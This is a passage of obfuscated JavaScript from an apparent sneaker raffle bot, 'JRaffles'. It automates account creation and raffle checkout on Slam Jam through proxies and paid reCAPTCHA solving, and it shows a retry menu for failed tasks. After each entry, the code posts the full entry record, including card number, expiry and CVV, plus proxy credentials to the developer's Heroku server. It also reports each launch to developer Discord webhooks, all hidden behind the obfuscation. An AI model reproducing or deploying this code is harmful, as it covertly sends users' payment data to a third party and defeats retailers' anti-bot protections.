                            }), await _0x3c3403['goto']('https://drop.slamjam.com/account/register'), await _0x488ffe(0xbb8), await _0x3c3403['waitForSelector']('#FirstName'), await _0x3c3403['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x3c3403['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), console['log'](_0x42a46a() + '\x20[' + _0x11c84c['name'] + ']\x20Task\x20' + (_0x491849 + 0x1) + '\x20:\x20Filling\x20information'), await _0x488ffe(0x4b0), await _0x3c3403['type']('#FirstName', '' + _0x2baa01[_0x491849]['FirstName']), await _0x488ffe(0x226), await _0x3c3403['type']('#LastName', '' + _0x2baa01[_0x491849]['LastName']), await _0x488ffe(0x226), await _0x3c3403['type']('#Email', '' + _0x2baa01[_0x491849]['Email']), await _0x488ffe(0x2ee), await _0x3c3403['type']('#ConfirmEmail', '' + _0x2baa01[_0x491849]['Email']), await _0x488ffe(0x2ee), await _0x3c3403['type']('#CreatePassword', '' + _0x2baa01[_0x491849]['Password']), await _0x488ffe(0x2ee), await _0x3c3403['type']('#CreateConfirmPassword', '' + _0x2baa01[_0x491849]['Password']), await _0x488ffe(0x226), console['log'](_0x42a46a() + '\x20[' + _0x11c84c['name'] + ']\x20Task\x20' + (_0x491849 + 0x1) + '\x20:\x20Submitting..'), await _0x3c3403['$eval']('#create_customer', _0x4895d6 => _0x4895d6['submit']()), await _0x488ffe(0x1388), console['log'](_0x42a46a() + '\x20[' + _0x11c84c['name'] + ']\x20Task\x20' + (_0x491849 + 0x1) + '\x20:\x20' + _0x387ef2['cyan']('Solving\x20Captcha')), await _0x3c3403['solveRecaptchas'](), console['log'](_0x42a46a() + '\x20[' + _0x11c84c['name'] + ']\x20Task\x20' + (_0x491849 + 0x1) + '\x20:\x20Captcha\x20solved'), await _0x3c3403['$eval']('.shopify-challenge__container\x20>\x20form', _0x2c496d => _0x2c496d['submit']());
                            try {
                                await _0x3c3403['waitForSelector']('.product-card__image'), await _0x488ffe(0x1f4), _0x584578 = 'no', console['log'](_0x387ef2['green'](_0x42a46a() + '\x20[' + _0x11c84c['name'] + ']\x20Task\x20' + (_0x491849 + 0x1) + '\x20:\x20Account\x20' + _0x2baa01[_0x491849]['Email'] + '\x20Generated!')), _0x7d8dbf['appendFileSync']('../accounts/slamjam.csv', '\x0a' + _0x2baa01[_0x491849]['Email'] + ',' + _0x2baa01[_0x491849]['Password']), console['log'](_0x387ef2['yellow'](_0x42a46a() + '\x20[' + _0x11c84c['name'] + ']\x20Task\x20' + (_0x491849 + 0x1) + '\x20:\x20Account\x20' + _0x2baa01[_0x491849]['Email'] + '\x20Saved\x20in\x20\x27accounts/slamjam.csv\x27'));
                                try {
                                    _0x5450ed['webhook'] != undefined && _0x5450ed['webhook'] != '' && await _0x49f827(_0x5450ed['webhook'], _0x484809['succesDEVMSG']);
                                } catch {
                                }
                                await _0x49f827(_0x2b5f53, _0x484809['succesDEVMSG']);
                            } catch (_0x125777) {
                                console['log'](_0x387ef2['red'](_0x42a46a() + '\x20[' + _0x20cf41[taskModule]['name'] + ']\x20Task\x20' + (_0x491849 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x125777));
                            }
                        } catch (_0x49a203) {
                            console['log'](_0x387ef2['red'](_0x42a46a() + '\x20[' + _0x20cf41[taskModule]['name'] + ']\x20Task\x20' + (_0x491849 + 0x1) + '\x20:\x20' + _0x49a203));
                        } finally {
                            _0x16a892 && _0x16a892['close']();
                            if (_0x584578 == 'yes' && _0x3f3f1a != 0x5) {
                                console['log'](_0x387ef2['red'](_0x42a46a() + '\x20[' + _0x11c84c['name'] + ']\x20Task\x20' + (_0x491849 + 0x1) + '\x20:\x20Retrying\x20(' + _0x3f3f1a + '\x20/\x205)')), _0x491849 = _0x491849 - 0x1, _0x3f3f1a = _0x3f3f1a + 0x1;
                                continue;
                            }
                            _0x584578 == 'yes' && _0x3f3f1a >= 0x5 && (_0x2e6413(_0x2baa01[_0x491849], _0x11c84c), _0x584578 = 'no', _0x3f3f1a = 0x0), console['log']('Waiting\x20for\x20' + _0x5450ed['delay'] + '\x20ms'), await _0x488ffe(_0x5450ed['delay']);
                        }
                    }
                }
            },
            {
                'name': 'SLAM\x20JAM\x20Raffle\x20Entries',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x46901f, _0x3f71ce, _0x3b5089) {
                    _0x4ab5bb['use'](_0x44f368()), _0x4ab5bb['use'](_0x45c327({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x5450ed['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x2507fb = 0x0; _0x2507fb < _0x3f71ce['length']; _0x2507fb++) {
                        var _0x53c26f;
                        if (_0x599945 != 'yes')
                            var _0x599945 = '', _0x42c64f = 0x0;
                        _0x55ca22(_0x46901f['name'] + '\x20Task\x20' + (_0x2507fb + 0x1) + '\x20/\x20' + _0x3f71ce['length'] + '\x20||\x20File:\x20' + _0x121079 + '\x20Proxies:\x20' + _0x590947);
                        try {
                            await _0x3215be(_0x3f71ce, _0x2507fb);
                        } catch {
                            _0x599945 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x3f71ce[_0x2507fb]['Email'] == '' || _0x3f71ce[_0x2507fb]['Password'] == '' || _0x3f71ce[_0x2507fb]['FirstName'] == '' || _0x3f71ce[_0x2507fb]['LastName'] == '') {
                            console['log'](_0x42a46a() + '\x20[' + _0x46901f['name'] + ']\x20Task\x20' + (_0x2507fb + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x5450ed['useRandomProxy'] = ![])
                            var _0x1dc5c0 = _0x3b5089[_0x2507fb]['split'](':');
                        else
                            var _0x381025 = Math['round'](Math['random']() * (_0x3b5089['length'] - 0x1)), _0x1dc5c0 = _0x3b5089[_0x381025]['split'](':');
                        var _0x21bc44;
                        try {
                            _0x21bc44 = await _0x4ab5bb['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x1dc5c0[0x0] + ':' + _0x1dc5c0[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x21bc44 = await _0x4ab5bb['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x1dc5c0[0x0] + ':' + _0x1dc5c0[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x2f9f6b = await _0x21bc44['newPage']();
                            await _0x2f9f6b['authenticate']({
                                'username': '' + _0x1dc5c0[0x2],
                                'password': '' + _0x1dc5c0[0x3]
                            }), await _0x2f9f6b['setViewport']({
                                'width': 0x500,
                                'height': 0x2d0
                            }), console['log'](_0x42a46a() + '\x20[' + _0x46901f['name'] + ']\x20Task\x20' + (_0x2507fb + 0x1) + '\x20:\x20Getting\x20Session'), await _0x2f9f6b['setRequestInterception'](!![]), _0x2f9f6b['on']('request', _0x29ab73 => {
                                _0x29ab73['resourceType']() === 'image' || _0x29ab73['resourceType']() === 'font' || _0x29ab73['resourceType']() === 'media' ? _0x29ab73['abort']() : _0x29ab73['continue']();
                            }), await _0x2f9f6b['goto']('https://drop.slamjam.com/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x2f9f6b['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x2f9f6b['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x488ffe(0x258), await _0x2f9f6b['waitForSelector']('#CustomerEmail'), console['log'](_0x42a46a() + '\x20[' + _0x46901f['name'] + ']\x20Task\x20' + (_0x2507fb + 0x1) + '\x20:\x20Logging\x20in..'), await _0x2f9f6b['type']('#CustomerEmail', '' + _0x3f71ce[_0x2507fb]['Email']), await _0x488ffe(0x12c), await _0x2f9f6b['type']('#CustomerPassword', '' + _0x3f71ce[_0x2507fb]['Password']), await _0x488ffe(0x226), await _0x2f9f6b['$eval']('#customer_login', _0x7f10bc => _0x7f10bc['submit']()), await _0x488ffe(0x7d0), await _0x2f9f6b['waitForSelector']('iframe[title=\x22reCAPTCHA\x22]'), console['log'](_0x42a46a() + '\x20[' + _0x46901f['name'] + ']\x20Task\x20' + (_0x2507fb + 0x1) + '\x20:\x20' + _0x387ef2['cyan']('Solving\x20Captcha')), await _0x2f9f6b['solveRecaptchas'](), console['log'](_0x42a46a() + '\x20[' + _0x46901f['name'] + ']\x20Task\x20' + (_0x2507fb + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x2f9f6b['$eval']('.shopify-challenge__container\x20>\x20form', _0x2305de => _0x2305de['submit']());
                            try {
                                await _0x2f9f6b['waitForSelector']('.nav-account'), await _0x488ffe(0x4b0);
                            } catch {
                                console['log'](_0x387ef2['red'](_0x42a46a() + '\x20[' + _0x46901f['name'] + ']\x20Task\x20' + (_0x2507fb + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x2f9f6b['goto']('' + _0x3f71ce[_0x2507fb]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x488ffe(0xbb8), console['log'](_0x42a46a() + '\x20[' + _0x46901f['name'] + ']\x20Task\x20' + (_0x2507fb + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x2f9f6b['waitForSelector']('#ProductSelect-product-template-raffle');
                            } catch {
                            }
                            await _0x2f9f6b['click']('.product-select-variant-wrapper'), await _0x488ffe(0x320), await _0x2f9f6b['click']('li.product-select-variant__value[data-size=\x22' + _0x3f71ce[_0x2507fb]['Size'] + '\x22]'), await _0x488ffe(0x384), await _0x2f9f6b['$eval']('#AddToCartForm-product-template-raffle', _0x45d32d => _0x45d32d['submit']()), await _0x2f9f6b['waitForSelector']('.cart-order-summary__content'), await _0x488ffe(0x514), await _0x2f9f6b['goto']('https://drop.slamjam.com/checkout'), await _0x488ffe(0x514), await _0x2f9f6b['waitForSelector']('#checkout_shipping_address_country'), console['log'](_0x42a46a() + '\x20[' + _0x46901f['name'] + ']\x20Task\x20' + (_0x2507fb + 0x1) + '\x20:\x20Filling\x20Information'), await _0x2f9f6b['select']('#checkout_shipping_address_country', '' + _0x3f71ce[_0x2507fb]['Country']), await _0x488ffe(0x200), await _0x2f9f6b['waitForSelector']('#checkout_shipping_address_first_name'), await _0x2f9f6b['type']('#checkout_shipping_address_first_name', '' + _0x3f71ce[_0x2507fb]['FirstName']), await _0x488ffe(0x237), await _0x2f9f6b['type']('#checkout_shipping_address_last_name', '' + _0x3f71ce[_0x2507fb]['LastName']), await _0x488ffe(0x1e0), await _0x2f9f6b['type']('#checkout_shipping_address_address1', _0x3f71ce[_0x2507fb]['Address1'] + '\x20' + _0x3f71ce[_0x2507fb]['HouseNumber']), await _0x488ffe(0x514), await _0x2f9f6b['type']('#checkout_shipping_address_address2', '' + _0x3f71ce[_0x2507fb]['Address2']), await _0x488ffe(0x514);
                            _0x3f71ce[_0x2507fb]['Postcode'] == undefined && (_0x3f71ce[_0x2507fb]['Postcode'] = _0x3f71ce[_0x2507fb]['Zip']);
                            await _0x2f9f6b['type']('#checkout_shipping_address_zip', '' + _0x3f71ce[_0x2507fb]['Postcode']), await _0x488ffe(0x2bc), await _0x2f9f6b['type']('#checkout_shipping_address_city', '' + _0x3f71ce[_0x2507fb]['City']), await _0x488ffe(0x320), await _0x2f9f6b['type']('#checkout_shipping_address_phone', '' + _0x3f71ce[_0x2507fb]['Phone']), await _0x488ffe(0x320), await _0x2f9f6b['click']('#continue_button'), await _0x488ffe(0xbb8), await _0x2f9f6b['waitForSelector']('.summary-title'), await _0x488ffe(0x320), await _0x2f9f6b['click']('#continue_button'), await _0x488ffe(0x320), console['log'](_0x42a46a() + '\x20[' + _0x46901f['name'] + ']\x20Task\x20' + (_0x2507fb + 0x1) + '\x20:\x20Finishing\x20Checkout'), await _0x2f9f6b['waitForSelector']('#checkout_credit_card_vault'), await _0x488ffe(0x3e8);
                            var _0x56b6ce = await _0x2f9f6b['$']('iframe[title=\x22Field\x20container\x20for:\x20Card\x20number\x22]'), _0xd788a9 = await _0x56b6ce['contentFrame']();
                            await _0xd788a9['click']('#number'), await _0x488ffe(0x3e8), await _0xd788a9['type']('#number', '' + _0x3f71ce[_0x2507fb]['CardNumber'], { 'delay': 0x78 }), _0x56b6ce = await _0x2f9f6b['$']('iframe[title=\x22Field\x20container\x20for:\x20Name\x20on\x20card\x22]'), _0xd788a9 = await _0x56b6ce['contentFrame'](), await _0x488ffe(0x1c2), await _0xd788a9['click']('#name'), await _0x488ffe(0x1f4), await _0xd788a9['type']('#name', '' + _0x3f71ce[_0x2507fb]['NameOnCard'], { 'delay': 0x78 }), _0x56b6ce = await _0x2f9f6b['$']('iframe[title=\x22Field\x20container\x20for:\x20Expiration\x20date\x20(MM\x20/\x20YY)\x22]'), _0xd788a9 = await _0x56b6ce['contentFrame'](), await _0x488ffe(0x1c2), await _0xd788a9['click']('#expiry'), await _0x488ffe(0x1f4), await _0xd788a9['type']('#expiry', '' + _0x3f71ce[_0x2507fb]['ExpiryDate'], { 'delay': 0x78 }), _0x56b6ce = await _0x2f9f6b['$']('iframe[title=\x22Field\x20container\x20for:\x20Security\x20code\x22]'), _0xd788a9 = await _0x56b6ce['contentFrame'](), await _0x488ffe(0x1c2), await _0xd788a9['click']('#verification_value'), await _0x488ffe(0x1f4), await _0xd788a9['type']('#verification_value', '' + _0x3f71ce[_0x2507fb]['CVV'], { 'delay': 0x78 }), await _0x2f9f6b['$eval']('#accepts-flag-raffle', _0x2da781 => _0x2da781['click']()), await _0x488ffe(0x7d0), console['log'](_0x42a46a() + '\x20[' + _0x46901f['name'] + ']\x20Task\x20' + (_0x2507fb + 0x1) + '\x20:\x20Processing\x20Order'), await _0x2f9f6b['$eval']('#continue_button', _0x4ce409 => _0x4ce409['click']()), await _0x488ffe(0x1b58), await _0x2f9f6b['waitForSelector']('.edit_checkout.animate-floating-labels'), await _0x2f9f6b['$eval']('.edit_checkout.animate-floating-labels', _0x2384d2 => _0x2384d2['submit']()), await _0x488ffe(0x7d0);
                            try {
                                await _0x2f9f6b['waitForSelector']('div[data-step=\x22thank_you\x22]', { 'timeout': 0x493e0 }), _0x599945 = 'no', _0xb5b21(_0x3f71ce[_0x2507fb], _0x46901f), console['log'](_0x387ef2['green'](_0x42a46a() + '\x20[' + _0x46901f['name'] + ']\x20Task\x20' + (_0x2507fb + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            } catch (_0x16d10d) {
                                throw new Error('Error\x20Processing\x20Order:\x20' + _0x16d10d['message']);
                            }
                            var _0xe58f2a = await _0x5605d8(_0x3f71ce[_0x2507fb], _0x46901f, 'dev', ![]), _0x27eabf = await _0x5605d8(_0x3f71ce[_0x2507fb], _0x46901f, 'pub', ![]);
                            let _0x6f67ac = _0x3f71ce[_0x2507fb];
                            try {
                                prxdata = {
                                    'username': _0x15d59c['replace']('#', ''),
                                    'module': _0x46901f['name'],
                                    'entrydata': JSON['stringify'](_0x6f67ac),
                                    'proxy': '' + _0x3b5089[_0x2507fb]
                                };
                                var _0x422a47 = JSON['stringify'](prxdata);
                                let _0x556828 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x1ea050['post']('https://jraffles.herokuapp.com/success', _0x422a47, _0x556828);
                            } catch (_0x519e04) {
                            }
                            const _0x16a732 = {
                                'succesDEVMSG': { 'embeds': [_0xe58f2a] },
                                'succesPUBMSG': { 'embeds': [_0x27eabf] }
                            };
                            try {
                                _0x5450ed['webhook'] != undefined && _0x5450ed['webhook'] != '' && await _0x49f827(_0x5450ed['webhook'], _0x16a732['succesDEVMSG']), await _0x488ffe(0xc8), await _0x49f827(_0xf35405, _0x16a732['succesDEVMSG']), await _0x488ffe(0xc8), await _0x49f827(_0x1bf959, _0x16a732['succesPUBMSG']);
                            } catch (_0x8eb3b5) {
                                console['log'](_0x387ef2['yellow'](_0x42a46a() + '\x20[' + _0x20cf41[taskModule]['name'] + ']\x20Task\x20' + (_0x2507fb + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x8eb3b5));
                            }
                        } catch (_0x388ee6) {
                            console['log'](_0x387ef2['red'](_0x42a46a() + '\x20[' + _0x20cf41[taskModule]['name'] + ']\x20Task\x20' + (_0x2507fb + 0x1) + '\x20:\x20' + _0x388ee6)), _0x53c26f = '' + _0x388ee6;
                            var _0x50b7db = await _0x5605d8(kickz[_0x2507fb], _0x46901f, 'dev', !![], _0x53c26f);
                            EMBEDS['errorDEV'] = { 'embeds': [_0x50b7db] }, _0x5450ed['webhook'] != undefined && _0x5450ed['webhook'] != '' && await _0x49f827(_0x5450ed['webhook'], EMBEDS['errorDEV']), await _0x49f827(_0x47580b, EMBEDS['errorDEV']), _0x599945 = 'yes';
                        } finally {
                            _0x21bc44 && _0x21bc44['close']();
                            if (_0x599945 == 'yes' && _0x42c64f != 0x5 && _0x53c26f != 'Size\x20Not\x20Found') {
                                console['log'](_0x387ef2['red'](_0x42a46a() + '\x20[' + _0x46901f['name'] + ']\x20Task\x20' + (_0x2507fb + 0x1) + '\x20:\x20Retrying\x20(' + _0x42c64f + '\x20/\x205)')), _0x2507fb = _0x2507fb - 0x1, _0x42c64f = _0x42c64f + 0x1;
                                continue;
                            }
                            _0x599945 == 'yes' && _0x42c64f >= 0x5 && (_0x2e6413(_0x3f71ce[_0x2507fb], _0x46901f), _0x599945 = 'no', _0x42c64f = 0x0), console['log']('Waiting\x20for\x20' + _0x5450ed['delay'] + '\x20ms'), await _0x488ffe(_0x5450ed['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'Failed\x20Tasks',
        'modules': [
            {
                'name': 'Retry\x20Failed\x20Tasks',
                'function': async function (_0x5a52a3) {
                    var _0x39612a = await _0x3d2085(), _0x14d287 = _0x7d8dbf['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x5b2278 = _0x16e760['parse'](_0x14d287, { 'header': !![] })['data'];
                    for (var _0x5972d3 = 0x0; _0x5972d3 < _0x5b2278['length']; _0x5972d3++) {
                        var _0x1cd429 = _0x5b2278[_0x5972d3]['Store'], _0x3768d1 = _0x5b2278[_0x5972d3]['Mode'];
                        for (var _0x75df68 of _0x20cf41) {
                            const _0x144cd8 = _0x75df68['name']['includes'](_0x1cd429);
                            if (!_0x144cd8)
                                continue;
                            for (mode of _0x75df68['modules']) {
                                if (mode['name'] == _0x3768d1) {
                                    console['log']('Running\x20' + _0x387ef2['cyan'](mode['name'])), await mode['function'](mode, [_0x5b2278[_0x5972d3]], _0x39612a);
                                    var _0x340fcb = _0x14d287['split']('\x0a')['splice'](0x0, 0x1)['join']('\x0a');
                                    _0x7d8dbf['writeFileSync']('../failed-tasks.csv', _0x340fcb);
                                }
                            }
                        }
                    }
                }
            },
            {
                'name': 'Clear\x20Failed\x20Tasks',
                'function': async function () {
                    console['clear'](), console['log']('Are\x20you\x20sure\x20you\x20want\x20to\x20clear\x20\x22failed-tasks.csv\x22?\x20(y/n)');
                    var _0x30698b = await _0x45ed26['get']('Answer');
                    if (_0x30698b['Answer']['toLowerCase']() == 'y') {
                        _0x7d8dbf['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), console['clear'](), console['log']('Cleared\x20Failed\x20Tasks'), await _0x488ffe(0x3e8);
                        return;
                    }
                    if (_0x30698b['Answer']['toLowerCase']() == 'n') {
                        console['clear'](), console['log']('Returning\x20to\x20Main\x20Menu'), await _0x488ffe(0x3e8);
                        return;
                    }
                    return console['clear'](), console['log']('Invalid\x20Input'), await _0x488ffe(0x3e8), this['function']();
                }
            }
        ]
    },
    { 'name': 'Paypal\x20Verification' },
    { 'name': 'Change\x20Settings' },
    { 'name': 'Reload\x20Settings' }
];
async function _0x2af18f(_0x2a4ec3) {
    var _0x470e4b = await _0x3d2085(), _0x4e2532 = _0x7d8dbf['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x4cc88e = _0x16e760['parse'](_0x4e2532, { 'header': !![] })['data'];
    for (var _0xf0241d = 0x0; _0xf0241d < _0x4cc88e['length']; _0xf0241d++) {
        var _0x34dfb0 = _0x4cc88e[_0xf0241d]['Store'], _0x126b32 = _0x4cc88e[_0xf0241d]['Mode'];
        for (var _0x22eb40 of _0x20cf41) {
            const _0x314283 = _0x22eb40['name']['includes'](_0x34dfb0);
            if (_0x314283)
                for (mode of _0x20cf41[_0x22eb40]['modules']) {
                    const _0x54a947 = mode['name']['includes'](_0x126b32);
                    _0x54a947 && (_0x2a4ec3 = mode['name'], await mode['function'](_0x2a4ec3, _0x4cc88e[_0xf0241d], _0x470e4b));
                }
        }
    }
}
async function _0x53799f() {
    await _0x54c091(), console['clear']();
    if (_0x21b502 != 'devkey') {
        let _0x4f08fa = await _0x425395['autoUpdate']();
        if (_0x4f08fa === 'yes')
            return _0x41d678('node\x20JRaffles.js');
        console['clear']();
    }
    if (_0x439fa3 == '') {
        console['log']('No\x20key\x20found\x20in\x20settings.json');
        return await _0x488ffe(0x2710);
        ;
    }
    await _0x25ae06(_0x439fa3);
    if (_0x1bbc43 === ![])
        return console['log']('Closing\x20Browser'), await _0x488ffe(0xbb8);
    else
        try {
            var _0x3d2b66 = [{
                'type': 'rich',
                'title': 'User\x20Opened\x20JRaffles',
                'description': '',
                'color': 0xc0d6d6,
                'fields': [
                    {
                        'name': 'User',
                        'value': '' + _0x15d59c
                    },
                    {
                        'name': 'Version',
                        'value': '' + _0x21b502
                    }
                ]
            }];
            const _0x1f085f = { 'embeds': _0x3d2b66 };
            var _0x1cb428 = await _0x5605d8(null, null, 'open', ![]);
            const _0x4465c7 = { 'openDEVMSG': { 'embeds': [_0x1cb428] } };
            await _0x49f827(_0x250708, _0x4465c7['openDEVMSG']);
            async function _0x40c650() {
                _0x55ca22('JRaffles\x20' + _0x21b502), console['clear'](), console['log']('Hello\x20' + _0x387ef2['cyan']('' + _0x15d59c) + ',\x20Welcome\x20to\x20JRaffles\x20' + _0x21b502), console['log']('Choose\x20a\x20Module\x20to\x20run..\x0a');
                for (var _0x5af546 = 0x0; _0x5af546 < _0x20cf41['length'] - 0x4; _0x5af546++) {
                    if (_0x5af546 >= 0xa) {
                        console['log']('\x20(' + _0x5af546 + ')\x20[' + _0x20cf41[_0x5af546]['name'] + ']');
                        continue;
                    }
                    if (_0x20cf41[_0x5af546]['name'] === 'Reload\x20Settings' || _0x20cf41[_0x5af546]['name'] === 'Change\x20Settings')
                        continue;
                    else
                        console['log']('\x20(' + _0x5af546 + ')\x20\x20[' + _0x20cf41[_0x5af546]['name'] + ']');
                }
                ;
                console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('\x20(' + (_0x20cf41['length'] - 0x4) + ')\x20Failed\x20Tasks'), console['log']('\x20(' + (_0x20cf41['length'] - 0x3) + ')\x20Paypal\x20Verification'), console['log']('\x20(' + (_0x20cf41['length'] - 0x2) + ')\x20Change\x20Settings'), console['log']('\x20(' + (_0x20cf41['length'] - 0x1) + ')\x20Reload\x20Settings'), console['log'](''), taskModule = await _0x15311c();
                if (taskModule > _0x20cf41['length'] - 0x1 || isNaN(taskModule) == !![])
                    return console['log']('Invalid\x20selection'), await _0x488ffe(0x3e8), _0x40c650();
                if (_0x20cf41[taskModule]['name'] == 'BSTN') {
                    taskFunction = await _0x5cf0f3(_0x20cf41[taskModule]['modules']);
                    var _0x478772 = _0x20cf41[taskModule]['modules'][taskFunction];
                    console['clear']();
                    try {
                        if (taskFunction == 0x3) {
                            var _0x12ff89 = await _0x3d2085();
                            await _0x478772['function'](_0x478772, _0x12ff89);
                        }
                        if (taskFunction == 0x2) {
                            var _0x12ff89 = await _0x3d2085(), _0x358d2a = await _0x3ea38a(_0x478772);
                            _0x5450ed['shuffleTasks'] && await _0x383032(_0x358d2a), await _0x478772['function'](_0x478772, _0x358d2a, _0x12ff89);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x12ff89 = await _0x3d2085(), _0x358d2a = await _0x3ea38a(_0x478772);
                                _0x5450ed['shuffleTasks'] && await _0x383032(_0x358d2a), await _0x478772['function'](_0x478772, _0x358d2a, _0x12ff89);
                            } else {
                                if (taskFunction == 0x1) {
                                    var _0x12ff89 = await _0x3d2085();
                                    await _0x478772['function'](_0x478772, _0x12ff89);
                                }
                            }
                        }
                    } catch (_0x1cb118) {
                        console['log'](_0x1cb118), await _0x488ffe(0x7d0);
                    }
                    return _0x40c650();
                }
                if (_0x20cf41[taskModule]['name'] == 'FENOM') {
                    try {
                        taskFunction = await _0x5cf0f3(_0x20cf41[taskModule]['modules']);
                        var _0x478772 = _0x20cf41[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x12ff89 = await _0x3d2085(), _0x3fe8a0 = await _0x3ea38a(_0x478772);
                            _0x5450ed['shuffleTasks'] && await _0x383032(_0x3fe8a0), await _0x478772['function'](_0x478772, _0x3fe8a0, _0x12ff89);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x12ff89 = await _0x3d2085(), _0x3fe8a0 = await _0x3ea38a(_0x478772);
                                _0x5450ed['shuffleTasks'] && await _0x383032(_0x3fe8a0), await _0x478772['function'](_0x478772, _0x3fe8a0, _0x12ff89);
                            }
                        }
                    } catch (_0x672e44) {
                        console['log'](_0x672e44), await _0x488ffe(0xfa0);
                    }
                    return _0x40c650();
                }
                if (_0x20cf41[taskModule]['name'] == '4ELEMENTOS') {
                    taskFunction = await _0x5cf0f3(_0x20cf41[taskModule]['modules']);
                    var _0x478772 = _0x20cf41[taskModule]['modules'][taskFunction];
                    console['clear']();
                    if (taskFunction == 0x1) {
                        var _0x12ff89 = await _0x3d2085();
                        return await _0x478772['function'](_0x478772, _0x12ff89), _0x40c650();
                    }
                    var _0x12ff89 = await _0x3d2085(), _0x443dea = await _0x3ea38a(_0x478772);
                    return _0x5450ed['shuffleTasks'] && await _0x383032(_0x443dea), await _0x478772['function'](_0x478772, _0x443dea, _0x12ff89), _0x40c650();
                }
                if (_0x20cf41[taskModule]['name'] == 'OneBlockDown') {
                    taskFunction = await _0x5cf0f3(_0x20cf41[taskModule]['modules']);
                    var _0x478772 = _0x20cf41[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x12ff89 = await _0x3d2085(), _0x443dea = await _0x3ea38a(_0x478772);
                    return _0x5450ed['shuffleTasks'] && await _0x383032(_0x443dea), await _0x478772['function'](_0x478772, _0x443dea, _0x12ff89), _0x40c650();
                }
                if (_0x20cf41[taskModule]['name'] == 'AFEW\x20Store') {
                    taskFunction = await _0x5cf0f3(_0x20cf41[taskModule]['modules']);
                    var _0x478772 = _0x20cf41[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x12ff89 = await _0x3d2085(), _0x443dea = await _0x3ea38a(_0x478772);
                    return _0x5450ed['shuffleTasks'] && await _0x383032(_0x443dea), await _0x478772['function'](_0x478772, _0x443dea, _0x12ff89), _0x40c650();
                }
                if (_0x20cf41[taskModule]['name'] == 'EQL') {
                    taskFunction = await _0x5cf0f3(_0x20cf41[taskModule]['modules']);
                    var _0x478772 = _0x20cf41[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x12ff89 = await _0x3d2085(), _0x443dea = await _0x3ea38a(_0x478772);
                    return _0x5450ed['shuffleTasks'] && await _0x383032(_0x443dea), await _0x478772['function'](_0x478772, _0x443dea, _0x12ff89), _0x40c650();
                } else {
                    if (_0x20cf41[taskModule]['name'] == 'MAHA\x20Amsterdam') {
                        taskFunction = await _0x5cf0f3(_0x20cf41[taskModule]['modules']);
                        var _0x478772 = _0x20cf41[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x0) {
                            var _0x12ff89 = await _0x3d2085(), _0x2aee84 = await _0x3ea38a(_0x478772);
                            return _0x5450ed['shuffleTasks'] && await _0x383032(_0x2aee84), await _0x478772['function'](_0x478772, _0x2aee84, _0x12ff89), _0x40c650();
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x12ff89 = await _0x3d2085();
                                return await _0x478772['function'](_0x478772, null, _0x12ff89), _0x40c650();
                            }
                        }
                        ;
                    } else {
                        if (_0x20cf41[taskModule]['name'] == 'FOOTSHOP') {
                            taskFunction = await _0x5cf0f3(_0x20cf41[taskModule]['modules']);
                            var _0x478772 = _0x20cf41[taskModule]['modules'][taskFunction], _0x12ff89 = await _0x3d2085(), _0x25b3ce = await _0x3ea38a(_0x478772);
                            return _0x5450ed['shuffleTasks'] && await _0x383032(_0x25b3ce), await _0x478772['function'](_0x478772, _0x25b3ce, _0x12ff89), await _0x488ffe(0x1388), _0x40c650();
                        } else {
                            if (_0x20cf41[taskModule]['name'] == 'OQIUM\x20Store') {
                                taskFunction = await _0x5cf0f3(_0x20cf41[taskModule]['modules']);
                                var _0x478772 = _0x20cf41[taskModule]['modules'][taskFunction];
                                console['clear']();
